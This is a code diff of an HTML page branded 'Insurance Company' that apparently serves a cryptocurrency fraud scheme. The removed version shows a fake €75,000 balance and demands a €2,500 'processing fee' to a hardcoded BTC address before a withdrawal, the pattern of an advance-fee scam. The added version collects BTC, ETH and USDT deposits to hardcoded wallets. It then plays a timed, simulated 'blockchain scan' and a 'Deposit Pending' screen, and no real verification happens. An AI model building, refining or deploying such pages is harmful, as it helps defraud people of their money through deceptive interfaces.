@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
     />
-    <title>Insurance Company - Withdraw</title>
+    <title>Insurance Company - Top Up</title>
     <!-- Premium Font: Inter -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -65,11 +65,6 @@
         outline: none;
       }
 
-      /* Glowing Effects */
-      .glow-brand {
-        box-shadow: 0 0 20px rgba(0, 71, 255, 0.4);
-      }
-
       /* Custom Loader */
       .spinner {
         width: 48px;
@@ -101,17 +96,28 @@
         }
       }
       .bg-animated {
-        background: linear-gradient(-45deg, #0b0e11, #001f66, #0b0e11);
-        background-size: 200% 200%;
-        animation: gradient-shift 8s ease infinite;
+        background: linear-gradient(-45deg, #0b0e11, #001f66, #0047ff, #0b0e11);
+        background-size: 300% 300%;
+        animation: gradient-shift 12s ease infinite;
       }
 
       /* Hide elements initially for GSAP */
-      #fee-screen,
+      #deposit-screen,
       #loading-screen,
       #success-screen,
       #toast {
         display: none;
+      }
+
+      /* Asset Selection Active State */
+      .asset-card.active {
+        border-color: #0047ff;
+        background-color: rgba(0, 71, 255, 0.05);
+      }
+      .asset-card.active .check-icon {
+        display: flex;
+        opacity: 1;
+        transform: scale(1);
       }
     </style>
   </head>
@@ -123,7 +129,7 @@
       class="max-w-[450px] mx-auto w-full h-[100dvh] bg-appBg relative flex flex-col overflow-hidden shadow-2xl border-x border-gray-900/50"
     >
       <!-- ========================================== -->
-      <!-- SCREEN 1: MAIN WITHDRAWAL FORM             -->
+      <!-- SCREEN 1: MAIN TOP UP SETUP                -->
       <!-- ========================================== -->
       <div
         id="main-screen"
@@ -131,10 +137,10 @@
       >
         <!-- Header -->
         <div
-          class="bg-animated pt-2 pb-6 rounded-b-[32px] shadow-[0_12px_40px_-10px_rgba(0,71,255,0.15)] relative z-20 shrink-0"
+          class="bg-animated pt-2 pb-6 rounded-b-[32px] shadow-[0_12px_40px_-10px_rgba(0,71,255,0.2)] relative z-20 shrink-0"
         >
           <header
-            class="flex justify-between items-center px-6 mb-4 relative"
+            class="flex justify-between items-center px-6 mb-2 relative"
             style="padding-top: max(1rem, env(safe-area-inset-top))"
           >
             <button
@@ -144,109 +150,141 @@
               <i class="ph ph-caret-left text-[22px]"></i>
             </button>
             <h1 class="text-[17px] font-bold tracking-wide drop-shadow-sm">
-              Withdraw Funds
+              Top Up Balance
             </h1>
             <div class="w-11 h-11"></div>
             <!-- Spacer -->
           </header>
-
-          <div class="text-center px-6 mt-4">
-            <p class="text-[13px] text-white/70 font-medium mb-1">
-              Available Balance
-            </p>
-            <h2
-              class="text-[36px] font-extrabold text-white tracking-tight leading-none"
-            >
-              €75,000.00
-            </h2>
-          </div>
         </div>
 
         <!-- Form Area -->
         <div class="px-5 pt-8 pb-4 flex flex-col gap-6">
-          <!-- Asset Selection (Locked to BTC) -->
-          <div class="flex flex-col gap-2">
-            <label class="text-[13px] font-semibold text-textMuted ml-1"
-              >Withdrawal Method</label
-            >
-            <div
-              class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center justify-between opacity-80 cursor-not-allowed"
-            >
-              <div class="flex items-center gap-3">
-                <div
-                  class="w-10 h-10 rounded-full bg-[#F7931A]/20 flex items-center justify-center"
-                >
-                  <i
-                    class="ph-fill ph-currency-btc text-[#F7931A] text-[22px]"
-                  ></i>
-                </div>
-                <div>
-                  <h3 class="text-[15px] font-bold text-white leading-tight">
-                    Bitcoin (BTC)
-                  </h3>
-                  <p class="text-[12px] text-textMuted mt-0.5">
-                    Network: Bitcoin
-                  </p>
-                </div>
-              </div>
-              <i class="ph-fill ph-lock-key text-textMuted text-[18px]"></i>
-            </div>
-            <p
-              class="text-[11px] text-brand font-medium ml-1 flex items-center gap-1 mt-1"
-            >
-              <i class="ph-fill ph-info"></i> For security reasons, only BTC
-              withdrawals are currently supported.
-            </p>
-          </div>
-
           <!-- Amount Input -->
           <div class="flex flex-col gap-2">
-            <div class="flex justify-between items-end ml-1">
-              <label class="text-[13px] font-semibold text-textMuted"
-                >Amount (EUR)</label
-              >
-              <button
-                id="btn-max"
-                class="text-[12px] font-bold text-brand bg-brand/10 px-2 py-0.5 rounded-md active:scale-95 transition"
-              >
-                MAX
-              </button>
-            </div>
+            <label class="text-[13px] font-semibold text-textMuted ml-1"
+              >Deposit Amount (EUR)</label
+            >
             <div
               class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center gap-3 focus-within:border-brand transition-colors duration-300"
             >
-              <span class="text-[20px] font-bold text-white/50">€</span>
+              <span class="text-[24px] font-bold text-white/50">€</span>
               <input
                 type="number"
-                id="withdraw-amount"
-                value="75000"
-                class="bg-transparent w-full text-[20px] font-bold text-white placeholder-white/20"
+                id="deposit-amount"
+                class="bg-transparent w-full text-[28px] font-extrabold text-white placeholder-white/20"
                 placeholder="0.00"
               />
             </div>
             <div class="flex justify-between items-center ml-1">
-              <p class="text-[11px] text-textMuted/70">Min: €100.00</p>
-              <p class="text-[12px] text-textMuted">≈ 1.1852 BTC</p>
+              <p class="text-[11px] text-textMuted/70">Min: €50.00</p>
+              <p
+                class="text-[13px] font-medium text-brand"
+                id="crypto-equivalent"
+              >
+                ≈ 0.00 BTC
+              </p>
             </div>
           </div>
 
-          <!-- Wallet Address -->
-          <div class="flex flex-col gap-2">
+          <!-- Asset Selection -->
+          <div class="flex flex-col gap-3 mt-2">
             <label class="text-[13px] font-semibold text-textMuted ml-1"
-              >Destination BTC Address</label
+              >Select Asset to Deposit</label
             >
-            <div
-              class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center gap-3 focus-within:border-brand transition-colors duration-300"
-            >
-              <input
-                type="text"
-                id="btc-address"
-                class="bg-transparent w-full text-[14px] font-medium text-white placeholder-white/20"
-                placeholder="Enter long BTC address..."
-              />
-              <button class="text-brand active:scale-90 transition-transform">
-                <i class="ph ph-scan text-[22px]"></i>
-              </button>
+
+            <div class="flex flex-col gap-3" id="asset-list">
+              <!-- BTC Card -->
+              <div
+                class="asset-card active w-full bg-surface border border-brand/50 bg-brand/5 rounded-[20px] p-4 flex items-center justify-between cursor-pointer transition-all duration-300"
+                data-asset="BTC"
+                data-rate="0.0000158"
+                data-address="bc1qvlse9lyrkws4dcx3e7q8gucaf72scdyt8t20rl"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="w-11 h-11 rounded-full bg-[#F7931A]/20 flex items-center justify-center"
+                  >
+                    <i
+                      class="ph-fill ph-currency-btc text-[#F7931A] text-[24px]"
+                    ></i>
+                  </div>
+                  <div>
+                    <h3 class="text-[15px] font-bold text-white leading-tight">
+                      Bitcoin
+                    </h3>
+                    <p class="text-[12px] text-textMuted mt-0.5">
+                      Bitcoin Network
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="check-icon w-6 h-6 rounded-full bg-brand flex items-center justify-center"
+                >
+                  <i class="ph-bold ph-check text-white text-[12px]"></i>
+                </div>
+              </div>
+
+              <!-- ETH Card -->
+              <div
+                class="asset-card w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center justify-between cursor-pointer transition-all duration-300 hover:bg-surfaceHover"
+                data-asset="ETH"
+                data-rate="0.00028"
+                data-address="0x713930976C4ab8D5AAd6fB394d40F02687b54C89"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="w-11 h-11 rounded-full bg-[#627EEA]/20 flex items-center justify-center"
+                  >
+                    <i
+                      class="ph-fill ph-currency-eth text-[#627EEA] text-[24px]"
+                    ></i>
+                  </div>
+                  <div>
+                    <h3 class="text-[15px] font-bold text-white leading-tight">
+                      Ethereum
+                    </h3>
+                    <p class="text-[12px] text-textMuted mt-0.5">
+                      ERC-20 Network
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="check-icon hidden opacity-0 scale-50 w-6 h-6 rounded-full bg-brand items-center justify-center transition-all duration-300"
+                >
+                  <i class="ph-bold ph-check text-white text-[12px]"></i>
+                </div>
+              </div>
+
+              <!-- USDT Card -->
+              <div
+                class="asset-card w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center justify-between cursor-pointer transition-all duration-300 hover:bg-surfaceHover"
+                data-asset="USDT"
+                data-rate="1.08"
+                data-address="0x713930976C4ab8D5AAd6fB394d40F02687b54C89"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="w-11 h-11 rounded-full bg-[#26A17B]/20 flex items-center justify-center"
+                  >
+                    <i
+                      class="ph-fill ph-currency-dollar text-[#26A17B] text-[24px]"
+                    ></i>
+                  </div>
+                  <div>
+                    <h3 class="text-[15px] font-bold text-white leading-tight">
+                      Tether (USDT)
+                    </h3>
+                    <p class="text-[12px] text-textMuted mt-0.5">
+                      TRC-20 Network
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="check-icon hidden opacity-0 scale-50 w-6 h-6 rounded-full bg-brand items-center justify-center transition-all duration-300"
+                >
+                  <i class="ph-bold ph-check text-white text-[12px]"></i>
+                </div>
+              </div>
             </div>
           </div>
         </div>
@@ -256,19 +294,19 @@
           class="sticky bottom-0 left-0 w-full px-5 pt-12 pb-8 bg-gradient-to-t from-[#0b0e11] via-[#0b0e11] via-60% to-transparent z-20 mt-auto pointer-events-none"
         >
           <button
-            id="btn-init-withdraw"
+            id="btn-continue"
             class="pointer-events-auto w-full bg-brand hover:bg-brand/90 text-white font-bold text-[16px] py-4 rounded-[20px] shadow-[0_8px_20px_-6px_rgba(0,71,255,0.6)] active:scale-[0.98] transition-all duration-200"
           >
-            Continue Withdrawal
+            Generate Deposit Address
           </button>
         </div>
       </div>
 
       <!-- ========================================== -->
-      <!-- SCREEN 2: FEE PAYMENT & PROOF UPLOAD       -->
+      <!-- SCREEN 2: DEPOSIT QR & ADDRESS             -->
       <!-- ========================================== -->
       <div
-        id="fee-screen"
+        id="deposit-screen"
         class="absolute inset-0 bg-appBg z-30 flex flex-col h-full overflow-y-auto no-scrollbar"
       >
         <header
@@ -276,123 +314,98 @@
           style="padding-top: max(1rem, env(safe-area-inset-top))"
         >
           <button
-            id="btn-back-fee"
+            id="btn-back-deposit"
             class="w-11 h-11 rounded-[18px] bg-surface border border-white/10 flex items-center justify-center text-white active:scale-90 transition-all duration-200"
           >
-            <i class="ph ph-x text-[22px]"></i>
+            <i class="ph ph-arrow-left text-[22px]"></i>
           </button>
-          <h1 class="text-[16px] font-bold tracking-wide">Action Required</h1>
+          <h1 class="text-[16px] font-bold tracking-wide">
+            Deposit <span id="deposit-header-asset">BTC</span>
+          </h1>
           <div class="w-11 h-11"></div>
         </header>
 
-        <div class="px-5 pt-2 pb-4 flex flex-col gap-5">
-          <!-- Alert Box -->
+        <div class="px-5 pt-2 pb-4 flex flex-col gap-6 items-center">
+          <div class="text-center px-4">
+            <p class="text-[14px] text-textMuted mb-2">
+              Send exactly this amount:
+            </p>
+            <h2
+              class="text-[32px] font-extrabold text-white tracking-tight leading-none"
+              id="final-crypto-amount"
+            >
+              0.00 BTC
+            </h2>
+            <p
+              class="text-[13px] text-brand font-medium mt-2"
+              id="final-eur-amount"
+            >
+              ≈ €0.00 EUR
+            </p>
+          </div>
+
+          <!-- QR Code Container -->
           <div
-            class="bg-warning/10 border border-warning/20 rounded-[20px] p-5 flex gap-4"
+            class="w-[220px] h-[220px] bg-white rounded-[24px] p-4 shadow-[0_0_40px_-10px_rgba(0,71,255,0.3)] flex items-center justify-center relative"
           >
-            <i
-              class="ph-fill ph-warning-circle text-warning text-[28px] shrink-0 mt-0.5"
-            ></i>
-            <div>
-              <h3 class="text-[15px] font-bold text-white mb-1">
-                Processing Fee Required
-              </h3>
-              <p class="text-[13px] text-white/70 leading-relaxed">
-                To process your withdrawal, network liquidity rules require a
-                standard processing fee of
-                <span class="text-white font-bold">€2,500</span> to be settled
-                externally.
-              </p>
-            </div>
+            <!-- Dynamic QR Code generated via API -->
+            <img
+              id="qr-code-img"
+              src=""
+              alt="QR Code"
+              class="w-full h-full object-contain mix-blend-multiply"
+            />
+            <div
+              class="absolute inset-0 border border-white/10 rounded-[24px] pointer-events-none"
+            ></div>
           </div>
 
           <!-- Payment Details -->
           <div
-            class="bg-surface border border-white/5 rounded-[24px] p-5 shadow-lg"
+            class="w-full bg-surface border border-white/5 rounded-[24px] p-5 shadow-lg mt-2"
           >
-            <h4 class="text-[14px] font-semibold text-textMuted mb-4">
-              Transfer Details
-            </h4>
-
-            <div
-              class="flex justify-between items-center mb-5 border-b border-white/5 pb-4"
-            >
-              <span class="text-[14px] text-textMuted">Amount Needed</span>
-              <div class="text-right">
-                <p class="text-[18px] font-bold text-white">~0.0395 BTC</p>
-                <p class="text-[12px] text-textMuted">
-                  €2,500.00 EUR equivalent
-                </p>
-              </div>
-            </div>
-
             <div class="flex flex-col gap-2">
-              <span class="text-[13px] text-textMuted"
-                >Send exactly to this BTC Address:</span
-              >
+              <div class="flex justify-between items-center">
+                <span class="text-[13px] text-textMuted font-medium"
+                  >Deposit Address</span
+                >
+                <span
+                  class="text-[11px] font-bold bg-[#14181d] px-2 py-1 rounded-md text-white/70"
+                  id="network-badge"
+                  >Network: BTC</span
+                >
+              </div>
               <div
-                class="w-full bg-[#14181d] border border-white/10 rounded-[16px] p-3 flex items-center justify-between gap-3 relative overflow-hidden group"
+                class="w-full bg-[#14181d] border border-white/10 rounded-[16px] p-3 pl-4 flex items-center justify-between gap-3 relative overflow-hidden group mt-1"
               >
                 <p
-                  id="fee-address"
-                  class="text-[13px] font-medium text-white/90 truncate font-mono"
+                  id="deposit-address"
+                  class="text-[13px] font-medium text-white/90 truncate font-mono tracking-wide"
                 >
-                  bc1qvhaa0mwk6e3804scw7cu7m8ac26dr42nq9rplz
+                  bc1q...
                 </p>
                 <button
                   id="btn-copy"
-                  class="shrink-0 bg-white/10 hover:bg-white/20 w-8 h-8 rounded-lg flex items-center justify-center transition-colors active:scale-90 pointer-events-auto"
+                  class="shrink-0 bg-white/10 hover:bg-white/20 w-9 h-9 rounded-xl flex items-center justify-center transition-colors active:scale-90 pointer-events-auto"
                 >
-                  <i class="ph ph-copy text-[16px] text-white"></i>
+                  <i class="ph ph-copy text-[18px] text-white"></i>
                 </button>
               </div>
             </div>
-          </div>
 
-          <!-- File Upload for Proof -->
-          <div class="flex flex-col gap-2 mt-2">
-            <h4 class="text-[14px] font-semibold text-textMuted ml-1">
-              Upload Proof of Payment
-            </h4>
-
-            <label
-              id="upload-area"
-              class="w-full border-2 border-dashed border-white/20 bg-surface/50 rounded-[24px] p-6 flex flex-col items-center justify-center gap-3 cursor-pointer hover:border-brand/50 hover:bg-surface transition-all duration-300 relative overflow-hidden"
+            <div
+              class="mt-5 p-3 rounded-[16px] bg-warning/10 border border-warning/20 flex gap-3"
             >
-              <input
-                type="file"
-                id="file-upload"
-                class="hidden"
-                accept="image/*,.pdf"
-              />
-              <div
-                id="upload-icon-container"
-                class="w-14 h-14 rounded-full bg-brand/10 text-brand flex items-center justify-center transition-colors"
-              >
-                <i
-                  id="upload-icon"
-                  class="ph ph-cloud-arrow-up text-[28px]"
-                ></i>
-              </div>
-              <div class="text-center">
-                <p
-                  id="upload-title"
-                  class="text-[15px] font-bold text-white mb-1"
-                >
-                  Tap to upload receipt
-                </p>
-                <p id="upload-subtitle" class="text-[12px] text-textMuted">
-                  JPG, PNG, or PDF format
-                </p>
-              </div>
-            </label>
-            <p
-              id="upload-error"
-              class="text-[12px] text-danger font-medium ml-1 hidden mt-1"
-            >
-              <i class="ph-fill ph-warning-circle"></i> Proof of payment is
-              required to proceed.
-            </p>
+              <i
+                class="ph-fill ph-warning-circle text-warning text-[20px] shrink-0"
+              ></i>
+              <p class="text-[12px] text-white/80 leading-snug">
+                Send only
+                <strong class="text-white" id="warning-asset">BTC</strong> to
+                this deposit address. Sending any other coin or token will
+                result in permanent loss.
+              </p>
+            </div>
           </div>
         </div>
 
@@ -401,10 +414,10 @@
           class="sticky bottom-0 left-0 w-full px-5 pt-12 pb-8 bg-gradient-to-t from-[#0b0e11] via-[#0b0e11] via-60% to-transparent mt-auto z-20 pointer-events-none"
         >
           <button
-            id="btn-verify"
+            id="btn-paid"
             class="pointer-events-auto w-full bg-white text-black font-bold text-[16px] py-4 rounded-[20px] shadow-[0_8px_20px_-6px_rgba(255,255,255,0.4)] active:scale-[0.98] transition-all duration-200"
           >
-            Submit Verification
+            I have made the transfer
           </button>
         </div>
       </div>
@@ -417,10 +430,9 @@
         class="absolute inset-0 bg-appBg/95 backdrop-blur-xl z-40 flex flex-col items-center justify-center h-full px-8 text-center"
       >
         <div class="spinner mb-8"></div>
-        <h2 class="text-[20px] font-bold text-white mb-2">Verifying Payment</h2>
+        <h2 class="text-[20px] font-bold text-white mb-2">Scanning Network</h2>
         <p class="text-[14px] text-textMuted leading-relaxed">
-          Please wait while we scan the blockchain and verify your proof of
-          payment document...
+          Please wait while we search the blockchain for your transaction...
         </p>
 
         <!-- Progress steps -->
@@ -434,7 +446,7 @@
               class="ph-bold ph-circle-dashed text-[20px] animate-spin"
               id="step-1-spin"
             ></i>
-            <span class="text-[14px] font-medium">Encrypting document...</span>
+            <span class="text-[14px] font-medium">Connecting to nodes...</span>
           </div>
           <div class="flex items-center gap-3 text-white/20" id="step-2">
             <i
@@ -447,7 +459,7 @@
             ></i>
             <i class="ph-bold ph-circle text-[20px]" id="step-2-idle"></i>
             <span class="text-[14px] font-medium"
-              >Validating hash on network...</span
+              >Locating transaction hash...</span
             >
           </div>
           <div class="flex items-center gap-3 text-white/20" id="step-3">
@@ -460,7 +472,9 @@
               id="step-3-spin"
             ></i>
             <i class="ph-bold ph-circle text-[20px]" id="step-3-idle"></i>
-            <span class="text-[14px] font-medium">Queuing withdrawal...</span>
+            <span class="text-[14px] font-medium"
+              >Verifying deposit amount...</span
+            >
           </div>
         </div>
       </div>
@@ -473,23 +487,24 @@
         class="absolute inset-0 bg-appBg z-50 flex flex-col items-center justify-center h-full px-6 text-center"
       >
         <div
-          class="w-24 h-24 rounded-full bg-success/10 flex items-center justify-center mb-6 scale-0"
+          class="w-24 h-24 rounded-full bg-brand/10 border border-brand/20 flex items-center justify-center mb-6 scale-0"
           id="success-icon-bg"
         >
-          <i class="ph-fill ph-check-circle text-success text-[64px]"></i>
+          <i class="ph-fill ph-clock text-brand text-[54px]"></i>
         </div>
         <h1
           class="text-[24px] font-extrabold text-white mb-3 opacity-0 translate-y-4"
           id="success-title"
         >
-          Verification Submitted
+          Deposit Pending
         </h1>
         <p
           class="text-[15px] text-textMuted leading-relaxed opacity-0 translate-y-4 mb-10"
           id="success-desc"
         >
-          Your proof has been sent. Our agents will check it as soon as possible
-          and the amount will be credited to your account.
+          Your request has been received. The network is currently processing
+          your transaction. Funds will be automatically credited to your balance
+          upon reaching the required confirmations.
         </p>
 
         <div class="w-full opacity-0 translate-y-4" id="success-btn">
@@ -518,49 +533,90 @@
     <script>
       document.addEventListener("DOMContentLoaded", () => {
         // --- Elements ---
+        const amountInput = document.getElementById("deposit-amount");
+        const cryptoEquivalent = document.getElementById("crypto-equivalent");
+        const assetCards = document.querySelectorAll(".asset-card");
+        const btnContinue = document.getElementById("btn-continue");
+
         const mainScreen = document.getElementById("main-screen");
-        const feeScreen = document.getElementById("fee-screen");
+        const depositScreen = document.getElementById("deposit-screen");
         const loadingScreen = document.getElementById("loading-screen");
         const successScreen = document.getElementById("success-screen");
 
-        const btnInitWithdraw = document.getElementById("btn-init-withdraw");
-        const withdrawAmountInput = document.getElementById("withdraw-amount");
-        const btcAddressInput = document.getElementById("btc-address");
-        const btnMax = document.getElementById("btn-max");
-
-        const btnBackFee = document.getElementById("btn-back-fee");
-        const btnVerify = document.getElementById("btn-verify");
+        const btnBackDeposit = document.getElementById("btn-back-deposit");
+        const btnPaid = document.getElementById("btn-paid");
         const btnCopy = document.getElementById("btn-copy");
 
-        const fileUpload = document.getElementById("file-upload");
-        const uploadArea = document.getElementById("upload-area");
-        const uploadIconContainer = document.getElementById(
-          "upload-icon-container",
+        // Dynamic Text Elements
+        const depHeaderAsset = document.getElementById("deposit-header-asset");
+        const finalCryptoAmount = document.getElementById(
+          "final-crypto-amount",
         );
-        const uploadIcon = document.getElementById("upload-icon");
-        const uploadTitle = document.getElementById("upload-title");
-        const uploadSubtitle = document.getElementById("upload-subtitle");
-        const uploadError = document.getElementById("upload-error");
+        const finalEurAmount = document.getElementById("final-eur-amount");
+        const qrCodeImg = document.getElementById("qr-code-img");
+        const depositAddress = document.getElementById("deposit-address");
+        const networkBadge = document.getElementById("network-badge");
+        const warningAsset = document.getElementById("warning-asset");
 
-        let isFileUploaded = false;
+        // State variables
+        let selectedAsset = "BTC";
+        let selectedRate = 0.0000158; // Default BTC rate roughly 1 EUR = 0.0000158 BTC
+        let selectedAddress = "bc1qvlse9lyrkws4dcx3e7q8gucaf72scdyt8t20rl";
+        let currentCryptoValue = 0;
+        let currentEurValue = 0;
 
-        // --- MAX Button Logic ---
-        btnMax.addEventListener("click", () => {
-          withdrawAmountInput.value = "75000";
-          // Add a small visual pop to the input container to show it worked
-          gsap.fromTo(
-            withdrawAmountInput.parentElement,
-            { scale: 0.98 },
-            { scale: 1, duration: 0.3, ease: "back.out(2)" },
-          );
+        // --- 1. Live Calculation ---
+        function updateConversion() {
+          const val = parseFloat(amountInput.value);
+          if (isNaN(val) || val <= 0) {
+            cryptoEquivalent.innerText = `≈ 0.00 ${selectedAsset}`;
+            currentCryptoValue = 0;
+            currentEurValue = 0;
+            return;
+          }
+          currentEurValue = val;
+          currentCryptoValue = val * selectedRate;
+
+          // Format decimals nicely based on coin
+          let decimals = selectedAsset === "USDT" ? 2 : 5;
+          cryptoEquivalent.innerText = `≈ ${currentCryptoValue.toFixed(decimals)} ${selectedAsset}`;
+        }
+
+        amountInput.addEventListener("input", updateConversion);
+
+        // --- 2. Asset Selection Logic ---
+        assetCards.forEach((card) => {
+          card.addEventListener("click", () => {
+            // Remove active from all
+            assetCards.forEach((c) => {
+              c.classList.remove("active", "bg-brand/5", "border-brand/50");
+              c.classList.add("border-white/10");
+              const icon = c.querySelector(".check-icon");
+              icon.classList.remove("flex", "opacity-100", "scale-100");
+              icon.classList.add("hidden", "opacity-0", "scale-50");
+            });
+
+            // Add active to clicked
+            card.classList.add("active", "bg-brand/5", "border-brand/50");
+            card.classList.remove("border-white/10");
+            const icon = card.querySelector(".check-icon");
+            icon.classList.remove("hidden", "opacity-0", "scale-50");
+            icon.classList.add("flex", "opacity-100", "scale-100");
+
+            // Update State
+            selectedAsset = card.getAttribute("data-asset");
+            selectedRate = parseFloat(card.getAttribute("data-rate"));
+            selectedAddress = card.getAttribute("data-address");
+
+            updateConversion();
+          });
         });
 
-        // --- 1. Transition: Main -> Fee Screen ---
-        btnInitWithdraw.addEventListener("click", () => {
-          // Check Minimum 100 EUR Rule
-          const amountValue = parseFloat(withdrawAmountInput.value);
-          if (isNaN(amountValue) || amountValue < 100) {
-            gsap.to(withdrawAmountInput.parentElement, {
+        // --- 3. Transition: Main -> Deposit Screen ---
+        btnContinue.addEventListener("click", () => {
+          if (isNaN(currentEurValue) || currentEurValue < 50) {
+            // Error Shake
+            gsap.to(amountInput.parentElement, {
               x: [-5, 5, -5, 5, 0],
               borderColor: "#F6465D",
               duration: 0.4,
@@ -568,44 +624,53 @@
             return;
           }
 
-          // Check if wallet address is empty
-          if (btcAddressInput.value.trim() === "") {
-            gsap.to(btcAddressInput.parentElement, {
-              x: [-5, 5, -5, 5, 0],
-              borderColor: "#F6465D",
-              duration: 0.4,
-            });
-            return;
-          }
+          // Populate Deposit Screen Data
+          let decimals = selectedAsset === "USDT" ? 2 : 5;
+          let formattedCrypto = currentCryptoValue.toFixed(decimals);
 
-          feeScreen.style.display = "flex";
+          depHeaderAsset.innerText = selectedAsset;
+          finalCryptoAmount.innerText = `${formattedCrypto} ${selectedAsset}`;
+          finalEurAmount.innerText = `≈ €${currentEurValue.toFixed(2)} EUR`;
+          depositAddress.innerText = selectedAddress;
+          warningAsset.innerText = selectedAsset;
+
+          // Network badge logic
+          let netStr = "BTC";
+          if (selectedAsset === "ETH") netStr = "ERC-20";
+          if (selectedAsset === "USDT") netStr = "TRC-20";
+          networkBadge.innerText = `Network: ${netStr}`;
+
+          // Generate Real QR Code based on address
+          qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${selectedAddress}&color=000000&bgcolor=ffffff`;
+
+          // Animate Screen Switch
+          depositScreen.style.display = "flex";
           gsap.fromTo(
-            feeScreen,
+            depositScreen,
             { y: "100%", opacity: 1 },
             { y: "0%", duration: 0.5, ease: "power3.out" },
           );
         });
 
-        // --- 2. Transition: Fee Screen -> Main (Back) ---
-        btnBackFee.addEventListener("click", () => {
-          gsap.to(feeScreen, {
+        // --- 4. Back Button ---
+        btnBackDeposit.addEventListener("click", () => {
+          gsap.to(depositScreen, {
             y: "100%",
             duration: 0.4,
             ease: "power3.in",
             onComplete: () => {
-              feeScreen.style.display = "none";
+              depositScreen.style.display = "none";
             },
           });
         });
 
-        // --- 3. Copy Clipboard Logic ---
+        // --- 5. Copy Clipboard Logic ---
         btnCopy.addEventListener("click", () => {
-          const address = document.getElementById("fee-address").innerText;
-          navigator.clipboard.writeText(address).then(() => {
+          navigator.clipboard.writeText(selectedAddress).then(() => {
             // Button visual feedback
             const originalIcon = btnCopy.innerHTML;
             btnCopy.innerHTML =
-              '<i class="ph-fill ph-check text-[16px] text-success"></i>';
+              '<i class="ph-fill ph-check text-[18px] text-success"></i>';
             btnCopy.classList.add("bg-success/20");
 
             // Show toast
@@ -638,52 +703,8 @@
           });
         });
 
-        // --- 4. File Upload Logic ---
-        fileUpload.addEventListener("change", (e) => {
-          if (e.target.files && e.target.files.length > 0) {
-            const fileName = e.target.files[0].name;
-            isFileUploaded = true;
-            uploadError.classList.add("hidden");
-
-            // Visual changes for success upload
-            uploadArea.classList.replace("border-white/20", "border-success");
-            uploadArea.classList.replace("bg-surface/50", "bg-success/5");
-
-            uploadIconContainer.classList.replace(
-              "bg-brand/10",
-              "bg-success/20",
-            );
-            uploadIconContainer.classList.replace("text-brand", "text-success");
-            uploadIcon.className = "ph-fill ph-file-check text-[28px]";
-
-            uploadTitle.innerText = "Document Attached";
-            uploadTitle.classList.replace("text-white", "text-success");
-
-            uploadSubtitle.innerText = fileName;
-
-            // Pop animation
-            gsap.fromTo(
-              uploadArea,
-              { scale: 0.98 },
-              { scale: 1, duration: 0.3, ease: "back.out(2)" },
-            );
-          }
-        });
-
-        // --- 5. Submit & Loading Sequence ---
-        btnVerify.addEventListener("click", () => {
-          if (!isFileUploaded) {
-            // Error state
-            uploadError.classList.remove("hidden");
-            gsap.to(uploadArea, {
-              x: [-8, 8, -5, 5, 0],
-              borderColor: "#F6465D",
-              duration: 0.4,
-            });
-            return;
-          }
-
-          // Start Loading
+        // --- 6. Submit & Loading Sequence ---
+        btnPaid.addEventListener("click", () => {
           loadingScreen.style.display = "flex";
           gsap.fromTo(
             loadingScreen,
@@ -691,9 +712,9 @@
             { opacity: 1, duration: 0.3 },
           );
 
-          // Mocking the complex verification steps with timelines
+          // Simulated blockchain scan timeline
           setTimeout(() => {
-            // Step 1 done, start Step 2
+            // Step 1 done
             document.getElementById("step-1-spin").classList.add("hidden");
             document.getElementById("step-1-check").classList.remove("hidden");
             document
@@ -708,7 +729,7 @@
           }, 1500);
 
           setTimeout(() => {
-            // Step 2 done, start Step 3
+            // Step 2 done
             document.getElementById("step-2-spin").classList.add("hidden");
             document.getElementById("step-2-check").classList.remove("hidden");
             document
@@ -723,7 +744,7 @@
           }, 3500);
 
           setTimeout(() => {
-            // Step 3 done, trigger success screen
+            // Step 3 done -> show success
             document.getElementById("step-3-spin").classList.add("hidden");
             document.getElementById("step-3-check").classList.remove("hidden");
             document
@@ -734,7 +755,7 @@
           }, 5000);
         });
 
-        // --- 6. Success Screen Animation ---
+        // --- 7. Success Screen Animation ---
         function showSuccessScreen() {
           successScreen.style.display = "flex";
           gsap.to(loadingScreen, {
